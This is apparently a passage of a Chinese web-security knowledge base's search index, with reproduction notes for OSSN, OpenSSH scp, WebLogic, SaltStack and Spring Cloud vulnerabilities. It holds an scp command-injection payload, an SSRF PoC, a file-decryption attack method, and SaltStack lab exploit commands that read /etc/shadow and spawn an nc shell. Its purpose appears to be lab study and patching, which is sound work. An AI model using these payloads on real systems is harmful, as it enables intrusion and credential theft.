\u6ce8\u610f\uff0c\u8fd9\u65f6\u8fd8\u6ca1\u6709\u70b9\u51fb\u53d1\u5e03\u8bc4\u8bba\uff0c\u4e0a\u56fe\u56fe\u7247\u53ea\u662f\u4e0a\u4f20\u6210\u529f\u540e\u7684\u4e00\u4e2a\u9884\u89c8\u56fe\u7247\u3002\u8be5\u4e34\u65f6\u56fe\u50cf\u6587\u4ef6\u5b58\u50a8\u4e8etmp\u76ee\u5f55\u5e76\u5728\u524d\u7aef\u5448\u73b0\u4e86\u9884\u89c8\u3002 \u6211\u4eec\u6765\u770b\u4e0b\u8fd9\u4e2a\u4e34\u65f6\u56fe\u7247\u6587\u4ef6\u662f\u5982\u4f55\u83b7\u53d6\u5e76\u5728\u9875\u9762\u4e2d\u5c55\u793a\u7684\u3002\u67e5\u770b\u4e00\u4e0b\u56fe\u7247\u94fe\u63a5 \u5728\u4e34\u65f6\u56fe\u7247\u6587\u4ef6\u88ab\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u65f6\uff0c\u4f1a\u88ab\u5b58\u50a8\u4e8eossn_data/tmp/photos\u6587\u4ef6\u5939\u4e2d \u653b\u51fb\u8005\u5728\u8bc4\u8bba\u91cc\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\uff0c\u4e0d\u70b9\u51fb\u53d1\u9001\uff0c\u67e5\u770b\u6b64\u65f6\u56fe\u7247\u4e34\u65f6\u9884\u89c8\u94fe\u63a5\uff0c\u83b7\u53d6\u94fe\u63a5\u4e2dimage\u53c2\u6570\u503c\u3002\u4f8b\u5982\uff1a http://192.167.30.119/comment/staticimage?image=UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ==\u4e2d\u7684UiszT0RJYStoQll2N2g5cHhmQW9PRHlCNVgrSWFKVzFQRHE4eTJqSWthVUVjUFBIb3pxME1FNUJFdk5ER2pONXI4V2pyeXJSMm9VPQ== \u5c06\u6570\u5b570-2147483647\u4f9d\u6b21\u5e26\u5165ossn_generate_site_secret\u4e2d\u8ba1\u7b97\u51fa\u5bf9\u5e94\u7684site_key \u4f9d\u6b21\u5c06site_key\u4e0eimage\u503c\u5e26\u5165ossn_string_decrypt\u4e2d\uff0c\u83b7\u53d6\u89e3\u5bc6\u540e\u7684\u660e\u6587 \u5982\u679c\u660e\u6587\u4e2d\u542b\u6709tmp/photos\u5b57\u7b26\u4e32\uff0c\u89e3\u5bc6\u6210\u529f\uff0c\u6b64\u65f6\u7684site_key\u5373\u4e3a\u6b63\u786e\u7684site_key\u503c \u5728\u83b7\u53d6site_key\u503c\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7ossn_string_encrypt\u65b9\u6cd5\uff0c\u5bf9\u60f3\u8981\u8bfb\u53d6\u7684\u6587\u4ef6\u8fdb\u884c\u52a0\u5bc6\uff0c\u901a\u8fc7http://192.167.30.119/comment/staticimage?image=\u63a5\u53e3\u8fdb\u884c\u8bfb\u53d6\u5373\u53ef \u4e0a\u6587\u6240\u6d89\u53ca\u7684\u5de5\u5177\u5982\u4e0b\uff1a site_key\u8ba1\u7b97\u5de5\u5177 https://github.com/LucidUnicorn/CVE-2020-10560-Key-Recovery \u52a0\u5bc6\u89e3\u5bc6\u5de5\u5177 https://github.com/kevthehermit/CVE-2020-10560","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"Web%E5%AE%89%E5%85%A8/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/","text":"\u6f0f\u6d1e\u6982\u8ff0 \u00b6 OpenSSH\uff08OpenBSD Secure Shell\uff09\u662fOpenBSD\u8ba1\u5212\u7ec4\u7684\u4e00\u5957\u7528\u4e8e\u5b89\u5168\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u8fde\u63a5\u5de5\u5177\u3002\u8be5\u5de5\u5177\u662fSSH\u534f\u8bae\u7684\u5f00\u6e90\u5b9e\u73b0\uff0c\u652f\u6301\u5bf9\u6240\u6709\u7684\u4f20\u8f93\u8fdb\u884c\u52a0\u5bc6\uff0c\u53ef\u6709\u6548\u963b\u6b62\u7a83\u542c\u3001\u8fde\u63a5\u52ab\u6301\u4ee5\u53ca\u5176\u4ed6\u7f51\u7edc\u7ea7\u7684\u653b\u51fb\u3002 OpenSSH 8.3p1\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u7684scp\u7684scp.c\u6587\u4ef6\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5916\u90e8\u8f93\u5165\u6570\u636e\u6784\u9020\u64cd\u4f5c\u7cfb\u7edf\u53ef\u6267\u884c\u547d\u4ee4\u8fc7\u7a0b\u4e2d\uff0c\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u672a\u6b63\u786e\u8fc7\u6ee4\u5176\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u3001\u547d\u4ee4\u7b49\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u975e\u6cd5\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002 \u6f0f\u6d1e\u539f\u7406 \u00b6 \u6f0f\u6d1e\u89e6\u53d1\u70b9\u5982\u4e0b\uff0c\u5f53\u6587\u4ef6\u590d\u5236\u5230\u8fdc\u7a0bSSH\u670d\u52a1\u5668\u65f6\uff0c\u6587\u4ef6\u8def\u5f84\u4f1a\u9644\u52a0\u5728\u672c\u5730scp\u547d\u4ee4\u7684\u672b\u5c3e\uff1a \u6bd4\u5982\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u65f6 scp source_file user@host: directory/destination_file \u5728SSH\u670d\u52a1\u5668\u7684\u672c\u5730\u5c06\u4f1a\u6267\u884c\uff1a scp -t directory/destination_file \u540c\u65f6\uff0c\u5728\u521b\u5efa\u672c\u5730scp\u547d\u4ee4\u65f6\uff0c\u672a\u6e05\u7406\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u53cd\u5f15\u53f7\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\uff0c\u800clinux\u7cfb\u7edf\u5141\u8bb8\u4ee5\u53cd\u5f15\u53f7\u8fdb\u884c\u6587\u4ef6\u547d\u540d\u3002\u6240\u4ee5\u5982\u679c\u628apayload\u5199\u5165\u5728\u53cd\u5f15\u53f7\u4e2d\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u5f53\u8c03\u7528scp\u547d\u4ee4\u65f6\u5c31\u4f1a\u89e6\u53d1payload\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 OpenSSH <=8.3p1 \u6f0f\u6d1e\u590d\u73b0 \u00b6 payload\uff1ascp /source_file user@ip:' touch /tmp/wow.sh /destination_file ' \u767b\u5f55\u5230SSH\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6267\u884c\u547d\u4ee4\u521b\u5efa\u4e86\u6587\u4ef6\uff1a \u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u8f83\u4e3a\u4e25\u683c\uff0c\u9700\u8981\u83b7\u53d6SSH\u670d\u52a1\u5668\u7684\u5bc6\u7801\u624d\u80fd\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u3002\u4f46\u662f\u5728\u67d0\u4e9b\u7279\u5b9a\u573a\u666f\u4e0b\u4e5f\u53ef\u53d1\u6325\u5927\u7528\u5904\uff0c\u6bd4\u5982SSH\u7aef\u53e3\u88ab\u9650\u5236\u8bbf\u95ee\uff0c\u5219\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u7684\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u4ece\u800c\u83b7\u53d6\u65b0\u6743\u9650\u3002 \u4fee\u590d\u5efa\u8bae \u00b6 \uff081\uff09\u5173\u6ce8\u5382\u5546\u7684\u5b89\u5168\u901a\u544a\u548c\u8865\u4e01\u53d1\u5e03\uff1a http://www.openssh.com/portable.html \uff082\uff09\u7981\u7528scp -r\u62f7\u8d1d\u76ee\u5f55\u7684\u65b9\u5f0f","title":"OpenSSH\u547d\u4ee4\u6ce8\u5165CVE-2020-15778"},{"location":"Web%E5%AE%89%E5%85%A8/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_1","text":"OpenSSH\uff08OpenBSD Secure Shell\uff09\u662fOpenBSD\u8ba1\u5212\u7ec4\u7684\u4e00\u5957\u7528\u4e8e\u5b89\u5168\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u8fde\u63a5\u5de5\u5177\u3002\u8be5\u5de5\u5177\u662fSSH\u534f\u8bae\u7684\u5f00\u6e90\u5b9e\u73b0\uff0c\u652f\u6301\u5bf9\u6240\u6709\u7684\u4f20\u8f93\u8fdb\u884c\u52a0\u5bc6\uff0c\u53ef\u6709\u6548\u963b\u6b62\u7a83\u542c\u3001\u8fde\u63a5\u52ab\u6301\u4ee5\u53ca\u5176\u4ed6\u7f51\u7edc\u7ea7\u7684\u653b\u51fb\u3002 OpenSSH 8.3p1\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u7684scp\u7684scp.c\u6587\u4ef6\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5916\u90e8\u8f93\u5165\u6570\u636e\u6784\u9020\u64cd\u4f5c\u7cfb\u7edf\u53ef\u6267\u884c\u547d\u4ee4\u8fc7\u7a0b\u4e2d\uff0c\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u672a\u6b63\u786e\u8fc7\u6ee4\u5176\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u3001\u547d\u4ee4\u7b49\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u975e\u6cd5\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_2","text":"\u6f0f\u6d1e\u89e6\u53d1\u70b9\u5982\u4e0b\uff0c\u5f53\u6587\u4ef6\u590d\u5236\u5230\u8fdc\u7a0bSSH\u670d\u52a1\u5668\u65f6\uff0c\u6587\u4ef6\u8def\u5f84\u4f1a\u9644\u52a0\u5728\u672c\u5730scp\u547d\u4ee4\u7684\u672b\u5c3e\uff1a \u6bd4\u5982\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u65f6 scp source_file user@host: directory/destination_file \u5728SSH\u670d\u52a1\u5668\u7684\u672c\u5730\u5c06\u4f1a\u6267\u884c\uff1a scp -t directory/destination_file \u540c\u65f6\uff0c\u5728\u521b\u5efa\u672c\u5730scp\u547d\u4ee4\u65f6\uff0c\u672a\u6e05\u7406\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u53cd\u5f15\u53f7\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\uff0c\u800clinux\u7cfb\u7edf\u5141\u8bb8\u4ee5\u53cd\u5f15\u53f7\u8fdb\u884c\u6587\u4ef6\u547d\u540d\u3002\u6240\u4ee5\u5982\u679c\u628apayload\u5199\u5165\u5728\u53cd\u5f15\u53f7\u4e2d\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u5f53\u8c03\u7528scp\u547d\u4ee4\u65f6\u5c31\u4f1a\u89e6\u53d1payload\u3002","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"Web%E5%AE%89%E5%85%A8/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_3","text":"OpenSSH <=8.3p1","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"Web%E5%AE%89%E5%85%A8/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_4","text":"payload\uff1ascp /source_file user@ip:' touch /tmp/wow.sh /destination_file ' \u767b\u5f55\u5230SSH\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6267\u884c\u547d\u4ee4\u521b\u5efa\u4e86\u6587\u4ef6\uff1a \u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u8f83\u4e3a\u4e25\u683c\uff0c\u9700\u8981\u83b7\u53d6SSH\u670d\u52a1\u5668\u7684\u5bc6\u7801\u624d\u80fd\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u3002\u4f46\u662f\u5728\u67d0\u4e9b\u7279\u5b9a\u573a\u666f\u4e0b\u4e5f\u53ef\u53d1\u6325\u5927\u7528\u5904\uff0c\u6bd4\u5982SSH\u7aef\u53e3\u88ab\u9650\u5236\u8bbf\u95ee\uff0c\u5219\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u7684\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u4ece\u800c\u83b7\u53d6\u65b0\u6743\u9650\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"Web%E5%AE%89%E5%85%A8/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_5","text":"\uff081\uff09\u5173\u6ce8\u5382\u5546\u7684\u5b89\u5168\u901a\u544a\u548c\u8865\u4e01\u53d1\u5e03\uff1a http://www.openssh.com/portable.html \uff082\uff09\u7981\u7528scp -r\u62f7\u8d1d\u76ee\u5f55\u7684\u65b9\u5f0f","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Weblogic\u5728\u5229\u7528T3\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u8d44\u6e90\u52a0\u8f7d\u8c03\u7528\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u8fdb\u884c\u9ed1\u540d\u5355\u8fc7\u6ee4\u4ee5\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u3002\u672c\u6f0f\u6d1e\u7ed5\u8fc7\u4e86Weblogic\u7684\u53cd\u5e8f\u5217\u5316\u9ed1\u540d\u5355\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684Weblogic\u7ec4\u4ef6\u5b9e\u65bd\u8fdc\u7a0b\u653b\u51fb\u3002 \u5f71\u54cd\u7248\u672c \u00b6 WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3 \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u4e25\u91cd \u6f0f\u6d1ePoC\u5982\u4e0b \u00b6 \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1V9Gq6V4yItIP5Et1wSfWsQ \u63d0\u53d6\u7801\uff1a8cx6 \u5b89\u5168\u5efa\u8bae \u00b6 \u4e00\u3001\u7981\u7528 T3 \u534f\u8bae \u5982\u679c\u60a8\u4e0d\u4f9d\u8d56 T3 \u534f\u8bae\u8fdb\u884c JVM \u901a\u4fe1\uff0c\u53ef\u901a\u8fc7\u6682\u65f6\u963b\u65ad T3 \u534f\u8bae\u7f13\u89e3\u6b64\u6f0f\u6d1e\u5e26\u6765\u7684\u5f71\u54cd\u3002 1. \u8fdb\u5165 Weblogic \u63a7\u5236\u53f0\uff0c\u5728 base_domain \u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u201c\u5b89\u5168\u201d\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u201c\u7b5b\u9009\u5668\u201d\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002 2. \u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165\uff1a* * 7001 deny t3 t3s\u3002 3. \u4fdd\u5b58\u751f\u6548\uff08\u65e0\u9700\u91cd\u542f\uff09\u3002 \u4e8c\u3001\u6392\u67e5\u5f31\u53e3\u4ee4 \u6392\u67e5 Weblogic \u7ba1\u7406\u540e\u53f0\u662f\u5426\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u589e\u5f3a\u5bc6\u7801\u5f3a\u5ea6\u3002 \u4e09\u3001\u5347\u7ea7\u8865\u4e01 \u76f8\u5173\u94fe\u63a5 :https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html","title":"Oracle WebLogic \u53cd\u5e8f\u5217\u5316\u4e25\u91cd\u6f0f\u6d1eCVE-2019-2890"},{"location":"Web%E5%AE%89%E5%85%A8/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_1","text":"Weblogic\u5728\u5229\u7528T3\u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u8d44\u6e90\u52a0\u8f7d\u8c03\u7528\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u8fdb\u884c\u9ed1\u540d\u5355\u8fc7\u6ee4\u4ee5\u4fdd\u8bc1\u53cd\u5e8f\u5217\u5316\u5b89\u5168\u3002\u672c\u6f0f\u6d1e\u7ed5\u8fc7\u4e86Weblogic\u7684\u53cd\u5e8f\u5217\u5316\u9ed1\u540d\u5355\uff0c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7T3\u534f\u8bae\u5bf9\u5b58\u5728\u6f0f\u6d1e\u7684Weblogic\u7ec4\u4ef6\u5b9e\u65bd\u8fdc\u7a0b\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"Web%E5%AE%89%E5%85%A8/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_2","text":"WebLogic Server 10.3.6.0 WebLogic Server 12.1.3.0 WebLogic Server 12.2.1.3","title":"\u5f71\u54cd\u7248\u672c"},{"location":"Web%E5%AE%89%E5%85%A8/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_3","text":"\u4e25\u91cd","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"Web%E5%AE%89%E5%85%A8/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#poc","text":"\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1V9Gq6V4yItIP5Et1wSfWsQ \u63d0\u53d6\u7801\uff1a8cx6","title":"\u6f0f\u6d1ePoC\u5982\u4e0b"},{"location":"Web%E5%AE%89%E5%85%A8/Oracle%20WebLogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%A5%E9%87%8D%E6%BC%8F%E6%B4%9ECVE-2019-2890/#_4","text":"\u4e00\u3001\u7981\u7528 T3 \u534f\u8bae \u5982\u679c\u60a8\u4e0d\u4f9d\u8d56 T3 \u534f\u8bae\u8fdb\u884c JVM \u901a\u4fe1\uff0c\u53ef\u901a\u8fc7\u6682\u65f6\u963b\u65ad T3 \u534f\u8bae\u7f13\u89e3\u6b64\u6f0f\u6d1e\u5e26\u6765\u7684\u5f71\u54cd\u3002 1. \u8fdb\u5165 Weblogic \u63a7\u5236\u53f0\uff0c\u5728 base_domain \u914d\u7f6e\u9875\u9762\u4e2d\uff0c\u8fdb\u5165\u201c\u5b89\u5168\u201d\u9009\u9879\u5361\u9875\u9762\uff0c\u70b9\u51fb\u201c\u7b5b\u9009\u5668\u201d\uff0c\u914d\u7f6e\u7b5b\u9009\u5668\u3002 2. \u5728\u8fde\u63a5\u7b5b\u9009\u5668\u4e2d\u8f93\u5165\uff1aweblogic.security.net.ConnectionFilterImpl\uff0c\u5728\u8fde\u63a5\u7b5b\u9009\u5668\u89c4\u5219\u6846\u4e2d\u8f93\u5165\uff1a* * 7001 deny t3 t3s\u3002 3. \u4fdd\u5b58\u751f\u6548\uff08\u65e0\u9700\u91cd\u542f\uff09\u3002 \u4e8c\u3001\u6392\u67e5\u5f31\u53e3\u4ee4 \u6392\u67e5 Weblogic \u7ba1\u7406\u540e\u53f0\u662f\u5426\u5b58\u5728\u5f31\u53e3\u4ee4\uff0c\u589e\u5f3a\u5bc6\u7801\u5f3a\u5ea6\u3002 \u4e09\u3001\u5347\u7ea7\u8865\u4e01 \u76f8\u5173\u94fe\u63a5 :https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html","title":"\u5b89\u5168\u5efa\u8bae"},{"location":"Web%E5%AE%89%E5%85%A8/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/","text":"\u5f71\u54cd\u8303\u56f4\uff1a \u00b6 SaltStack < 2019.2.4 SaltStack < 3000.2 \u9776\u673a\u73af\u5883\uff1aDebian10 \u9776\u673aIP\uff1a192.168.0.250 Kali\u653b\u51fb\u673aIP\uff1a192.168.0.124 \u5728Vulhub\u4e2d\u627e\u5230\u5e76\u8fdb\u5165\u8be5\u6f0f\u6d1e\u7f16\u53f7\u76ee\u5f55 cd Vulhub/saltstack/CVE-2020-11651 \u5728\u8be5\u76ee\u5f55\u542f\u52a8\u73af\u5883\uff1a docker-compose up -d \u67e5\u770b\u73af\u5883\u662f\u5426\u6210\u529f\u542f\u52a8 docker ps //\u67e5\u770bdocker\u4e2d\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668 \u5728\u653b\u51fb\u673a\u4e0a\u51c6\u5907Poc \u653b\u51fb\u673a\u73af\u5883\uff1aKali IP\uff1a192.168.0.124 \u9700\u8981\u5148\u5b89\u88c5Salt\u5e93\uff0c\u9700\u6307\u5b9aSalt\u5e93\u7248\u672c pip3 install salt=2019.2.3 \u7136\u540e\u6211\u6ca1\u6709pip3 \u5c31\u518d\u5b89\u88c5pip3 apt install python3-pip\uff08\u6211\u6ca1\u6210\u529f\uff09\u6362\u65b9\u6cd5 \u6d4f\u89c8\u5668\u5b89\u88c5Salt3000.1 \u4e0b\u8f7d\u5730\u5740https://pypi.org/simple/salt/ \u7136\u540e \u653e\u8fdbkali\u653b\u51fb\u673a\u89e3\u538b\uff1a tar -xvzf salt-3000.1.tar.gz \u8fdb\u5165\u89e3\u538b\u76ee\u5f55\u6267\u884c\u5b89\u88c5 python3 setup.py install \u5b89\u88c5\u5b8c\u6210\u540e\u8fd0\u884cPoc python3 exploit.py -m 192.168.0.250 \u6210\u529f\u8bfb\u53d6Key \u7ee7\u7eed\u8bfb\u53d6\u6587\u4ef6\uff1a python3 exploit.py -m 192.168.0.250 -r /etc/passwd \u6210\u529f\u8bfb\u53d6\u5bc6\u7801 \u5728\u9776\u673a\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff1a python3 exploit.py -m 192.168.0.250 --exec \"nc 127.0.0.1 4444 -e /bin/sh\" \u8bfb\u53d6/etc/shadow\u6587\u4ef6 python3 exploit.py -m 192.168.0.250 -r /etc/shadow \u6ce8\uff1a\u5e94\u8be5\u8fd8\u80fd\u5e72\u597d\u591a\u4e8b\u60c5. \u53c2\u8003\u94fe\u63a5\uff1a https://github.com/jasperla/CVE-2020-11651-poc","title":"SaltStack\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e CVE-2020-11651"},{"location":"Web%E5%AE%89%E5%85%A8/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#_1","text":"SaltStack < 2019.2.4 SaltStack < 3000.2 \u9776\u673a\u73af\u5883\uff1aDebian10 \u9776\u673aIP\uff1a192.168.0.250 Kali\u653b\u51fb\u673aIP\uff1a192.168.0.124 \u5728Vulhub\u4e2d\u627e\u5230\u5e76\u8fdb\u5165\u8be5\u6f0f\u6d1e\u7f16\u53f7\u76ee\u5f55 cd Vulhub/saltstack/CVE-2020-11651 \u5728\u8be5\u76ee\u5f55\u542f\u52a8\u73af\u5883\uff1a docker-compose up -d \u67e5\u770b\u73af\u5883\u662f\u5426\u6210\u529f\u542f\u52a8 docker ps //\u67e5\u770bdocker\u4e2d\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668 \u5728\u653b\u51fb\u673a\u4e0a\u51c6\u5907Poc \u653b\u51fb\u673a\u73af\u5883\uff1aKali IP\uff1a192.168.0.124 \u9700\u8981\u5148\u5b89\u88c5Salt\u5e93\uff0c\u9700\u6307\u5b9aSalt\u5e93\u7248\u672c pip3 install salt=2019.2.3 \u7136\u540e\u6211\u6ca1\u6709pip3 \u5c31\u518d\u5b89\u88c5pip3 apt install python3-pip\uff08\u6211\u6ca1\u6210\u529f\uff09\u6362\u65b9\u6cd5 \u6d4f\u89c8\u5668\u5b89\u88c5Salt3000.1 \u4e0b\u8f7d\u5730\u5740https://pypi.org/simple/salt/ \u7136\u540e \u653e\u8fdbkali\u653b\u51fb\u673a\u89e3\u538b\uff1a tar -xvzf salt-3000.1.tar.gz \u8fdb\u5165\u89e3\u538b\u76ee\u5f55\u6267\u884c\u5b89\u88c5 python3 setup.py install \u5b89\u88c5\u5b8c\u6210\u540e\u8fd0\u884cPoc python3 exploit.py -m 192.168.0.250 \u6210\u529f\u8bfb\u53d6Key \u7ee7\u7eed\u8bfb\u53d6\u6587\u4ef6\uff1a python3 exploit.py -m 192.168.0.250 -r /etc/passwd \u6210\u529f\u8bfb\u53d6\u5bc6\u7801 \u5728\u9776\u673a\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff1a python3 exploit.py -m 192.168.0.250 --exec \"nc 127.0.0.1 4444 -e /bin/sh\" \u8bfb\u53d6/etc/shadow\u6587\u4ef6 python3 exploit.py -m 192.168.0.250 -r /etc/shadow \u6ce8\uff1a\u5e94\u8be5\u8fd8\u80fd\u5e72\u597d\u591a\u4e8b\u60c5. \u53c2\u8003\u94fe\u63a5\uff1a https://github.com/jasperla/CVE-2020-11651-poc","title":"\u5f71\u54cd\u8303\u56f4\uff1a"},{"location":"Web%E5%AE%89%E5%85%A8/SpamTitan%207.07%E5%A4%9A%E4%B8%AARCE%E6%BC%8F%E6%B4%9E/","text":"\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1nCUADEBXrn-8vsuOjxFd1Q \u63d0\u53d6\u7801\uff1abyze","title":"SpamTitan 7.07\u591a\u4e2aRCE\u6f0f\u6d1e"},{"location":"Web%E5%AE%89%E5%85%A8/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF/","text":"\u6f0f\u6d1e\u4fe1\u606f: \u00b6 Spring Cloud Netflix\uff0c2.2.4\u4e4b\u524d\u76842.2.x\u7248\u672c\uff0c2.1.6\u4e4b\u524d\u76842.1.x\u7248\u672c\u4ee5\u53ca\u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528Hystrix Dashboard proxy.stream\u7aef\u70b9\u5411\u670d\u52a1\u5668\u6258\u7ba1\u53ef\u8bbf\u95ee\u7684\u4efb\u4f55\u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\u4eea\u8868\u677f\u3002\u6076\u610f\u7528\u6237\u6216\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u4e0d\u5e94\u516c\u5f00\u516c\u5f00\u7684\u5176\u4ed6\u670d\u52a1\u5668\u3002 \u5f71\u54cd\u8303\u56f4: \u00b6 Spring Cloud Netflix 2.2.0\u81f32.2.3 2.1.0\u81f32.1.5 \u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u4e5f\u4f1a\u53d7\u5230\u5f71\u54cd \u6f0f\u6d1e\u590d\u73b0: \u00b6 poc\uff1a \u00b6 /proxy.stream?origin=http://www.baidu.com \u200b``` #### \u4fee\u590d\u65b9\u6848: \u5b98\u65b9\u5df2\u7ecf\u8fdb\u884c\u5b89\u5168\u5347\u7ea7\uff0c\u53d7\u5f71\u54cd\u7528\u6237\u8bf7\u5c3d\u5feb\u5347\u7ea7\u5230\u4fee\u590d\u7248\u672c: Spring Cloud Netflix\uff1a 2.2.4 2.1.6 \u8f83\u65e7\u7684\u7248\u672c\u5e94\u5347\u7ea7\u5230\u53d7\u652f\u6301\u7684\u5206\u652f","title":"Spring Cloud Netflix Hystrix Dashboard SSRF"},{"location":"Web%E5%AE%89%E5%85%A8/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF/#_1","text":"Spring Cloud 